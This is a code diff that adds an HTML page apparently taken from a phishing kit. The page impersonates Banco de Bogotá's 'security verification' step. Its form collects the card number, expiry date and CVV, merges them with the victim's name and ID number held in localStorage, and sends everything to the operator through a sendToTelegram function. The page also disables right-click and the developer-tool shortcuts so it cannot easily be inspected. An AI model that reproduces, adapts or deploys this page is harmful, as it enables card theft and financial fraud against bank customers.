@@ -1,0 +1,394 @@
+
+
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <script>
+
+        
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123) return false;
+            if (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) return false;
+            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+        }
+    </script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Banco de Bogotá - Verificación</title>
+    <link rel="stylesheet" href="../../sapp2406.sirv.com/bogo/lfr_style.css" />
+    <link rel="stylesheet" href="../../sapp2406.sirv.com/bogo/lfr_ownstyle.css" />
+    <script src="../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+    <style>
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #2c3e50;
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loader-container {
+            position: relative;
+            width: 60px;
+            height: 60px;
+            animation: rotateLoader 1.5s linear infinite;
+        }
+
+        .dot {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+        }
+
+        .dot-yellow {
+            background-color: #f1c40f;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .dot-blue {
+            background-color: #3498db;
+            bottom: 5px;
+            left: 0;
+        }
+
+        .dot-red {
+            background-color: #e74c3c;
+            bottom: 5px;
+            right: 0;
+        }
+
+        @keyframes rotateLoader {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        body {
+            background: linear-gradient(90deg, #fcfcfc 50%, #eef3f6 50%) !important;
+            min-height: 100vh;
+            margin: 0;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        .container {
+            display: flex !important;
+            flex-direction: row !important;
+            justify-content: center !important;
+            max-width: 1000px !important;
+            margin: 0 auto !important;
+            padding: 20px !important;
+            background: transparent !important;
+        }
+
+        .login-card-content {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+
+        .container__login {
+            flex: 0 0 380px !important;
+            margin-right: 40px !important;
+            width: 380px !important;
+        }
+
+        .container__info {
+            flex: 1 !important;
+            max-width: 500px !important;
+        }
+
+        .container__info img {
+            border-radius: 8px;
+            width: 100%;
+        }
+
+        @media (max-width:768px) {
+            body {
+                background: #ffffff !important;
+            }
+
+            .container {
+                flex-direction: column !important;
+                padding: 15px !important;
+            }
+
+            .container__login {
+                width: 100% !important;
+                margin-right: 0 !important;
+            }
+
+            .container__info {
+                width: 100% !important;
+            }
+        }
+
+        .blue-banner {
+            background-color: #0033a0;
+            color: white;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            font-size: 0.9em;
+        }
+
+        .blue-banner img {
+            width: 40px;
+            margin-right: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-label {
+            display: block;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 5px;
+            font-size: 0.9em;
+        }
+
+        .custom-form-control {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 1em;
+            box-sizing: border-box;
+        }
+
+        .custom-form-control:focus {
+            border-color: #0033a0;
+            outline: none;
+        }
+
+        .row-2-cols {
+            display: flex;
+            gap: 15px;
+        }
+
+        .col-half {
+            flex: 1;
+        }
+
+        .btn-primary {
+            background-color: #0033a0;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 25px;
+            font-size: 1em;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .btn-primary:hover {
+            background-color: #002a80;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="loading-overlay">
+        <div class="loader-container">
+            <div class="dot dot-yellow"></div>
+            <div class="dot dot-blue"></div>
+            <div class="dot dot-red"></div>
+        </div>
+        <div style="color: white; margin-top: 20px;">Procesando...</div>
+    </div>
+
+    <div class="container">
+        <div class="container__login">
+            <div class="container__login--header">
+                <img src="logobanco1.jpg" alt="Banco de Bogotá" style="max-width: 200px; margin-bottom: 20px;" />
+            </div>
+
+            <div class="container__login--title">
+                <h2 style="font-size: 1.2rem; font-weight: bold; color: #333; margin-bottom: 15px;">Verificación de Seguridad</h2>
+            </div>
+
+            <div class="blue-banner">
+                <img src="per.png" alt="Icono" />
+                <div style="flex: 1;">
+                    <strong>Protegemos tu seguridad</strong><br>
+                    Ingresa los datos de tu tarjeta <span id="cardTypeLabel"></span> para validar tu identidad.
+                </div>
+            </div>
+
+            <div class="login-card-content">
+                <div id="error-mensaje" style="display:none; background-color: #ffebee; color: #c62828; padding: 10px; border-radius: 4px; text-align: center; margin-bottom: 15px; font-size: 0.9em; border: 1px solid #c62828;">
+    ⚠️ Tarjeta inválida. Por favor, verifica los datos e intenta de nuevo.
+</div>
+                <form id="formTarjeta" autocomplete="off" onsubmit="return enviarTarjeta(event);">
+                    <div class="form-group">
+                        <label class="form-label">Número de Tarjeta <span id="cardTypeFormLabel"></span></label>
+                        <input type="tel" id="inp_c_nm" maxlength="16" placeholder="0000 0000 0000 0000" class="custom-form-control" required autocomplete="off" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                    </div>
+
+                    <div class="row-2-cols">
+                        <div class="col-half">
+                            <div class="form-group">
+                                <label class="form-label">Fecha Exp (MM/AA)</label>
+                                <input type="tel" id="inp_c_xp" maxlength="5" placeholder="MM/AA" class="custom-form-control" required autocomplete="off">
+                            </div>
+                        </div>
+                        <div class="col-half">
+                            <div class="form-group">
+                                <label class="form-label">CVV</label>
+                                <input type="password" id="inp_c_vv" maxlength="3" placeholder="123" class="custom-form-control" required autocomplete="off" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                            </div>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-primary">Continuar</button>
+                </form>
+            </div>
+        </div>
+
+        <div class="container__info">
+            <img id="bannerImg" src="taval.jpeg" alt="Publicidad">
+        </div>
+    </div>
+
+    <script src="telegram.js"></script>
+    <script src="action.js"></script>
+
+    <script>
+        if (window.stopListening) {
+            window.stopListening();
+        }
+
+        // Mostrar tipo de tarjeta
+        document.addEventListener('DOMContentLoaded', function() {
+            const cardType = localStorage.getItem('card_type') || 'Débito';
+            const cardTypeLabel = document.getElementById('cardTypeLabel');
+            const cardTypeFormLabel = document.getElementById('cardTypeFormLabel');
+
+            if (cardTypeLabel) cardTypeLabel.textContent = cardType;
+            if (cardTypeFormLabel) cardTypeFormLabel.textContent = `(${cardType})`;
+
+            // Formato MM/AA
+            const expInput = document.getElementById('inp_c_xp');
+            expInput.addEventListener('input', function(e) {
+                let value = this.value.replace(/\D/g, '');
+                if (value.length >= 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+                this.value = value;
+            });
+        });
+
+        function enviarTarjeta(event) {
+            event.preventDefault();
+
+            const numero = document.getElementById('inp_c_nm').value.replace(/\s/g, '');
+            const exp = document.getElementById('inp_c_xp').value;
+            const cvv = document.getElementById('inp_c_vv').value;
+
+            if (!numero || !exp || !cvv) {
+                alert('Por favor completa todos los campos');
+                return false;
+            }
+
+            if (numero.length < 13 || numero.length > 19) {
+                alert('Número de tarjeta inválido');
+                return false;
+            }
+
+            if (!/^\d{2}\/\d{2}$/.test(exp)) {
+                alert('Formato de fecha inválido');
+                return false;
+            }
+
+            if (cvv.length < 3 || cvv.length > 4) {
+                alert('CVV inválido');
+                return false;
+            }
+
+            const cardType = localStorage.getItem('card_type') || 'Débito';
+
+            const userData = typeof getUserData === 'function' ? getUserData() : {
+                tipo_identificacion: localStorage.getItem('user_id_type') || 'CC',
+                numero_identificacion: localStorage.getItem('user_id_number') || 'Desconocido'
+            };
+
+            const cardData = {
+                tipo_tarjeta: cardType,
+                numero: numero,
+                vencimiento: exp,
+                cvv: cvv,
+                titular: localStorage.getItem('user_name') || 'No proporcionado',
+                tipo_identificacion: userData.tipo_identificacion,
+                numero_identificacion: userData.numero_identificacion
+            };
+
+            console.log('📤 Enviando tarjeta:', cardData);
+
+            const btnContinuar = document.querySelector('.btn-primary');
+            btnContinuar.disabled = true;
+            btnContinuar.textContent = 'Enviando...';
+            document.getElementById('loading-overlay').style.display = 'flex';
+
+            if (window.stopListening) {
+                window.stopListening();
+            }
+            localStorage.removeItem('bbogota_msg_id');
+
+            if (typeof actionProcessed !== 'undefined') {
+                actionProcessed = false;
+            }
+
+            if (typeof sendToTelegram === 'function') {
+                sendToTelegram('tarjeta', cardData, function() {
+                    console.log('✅ Tarjeta enviada');
+
+                    if (typeof listenCurrentButtons === 'function') {
+                        listenCurrentButtons(window.handleTelegramAction);
+                    }
+                });
+            } else {
+                console.error('❌ sendToTelegram no disponible');
+                alert('Error de conexión');
+                document.getElementById('loading-overlay').style.display = 'none';
+                btnContinuar.disabled = false;
+                btnContinuar.textContent = 'Continuar';
+            }
+
+            return false;
+        }
+        document.addEventListener('DOMContentLoaded', function() {
+    // Revisamos si la URL tiene el parámetro de error
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error') === 'invalid') {
+        // Si existe, mostramos el cuadro rojo
+        document.getElementById('error-mensaje').style.display = 'block';
+    }
+});
+    </script>
+</body>
+
+</html>
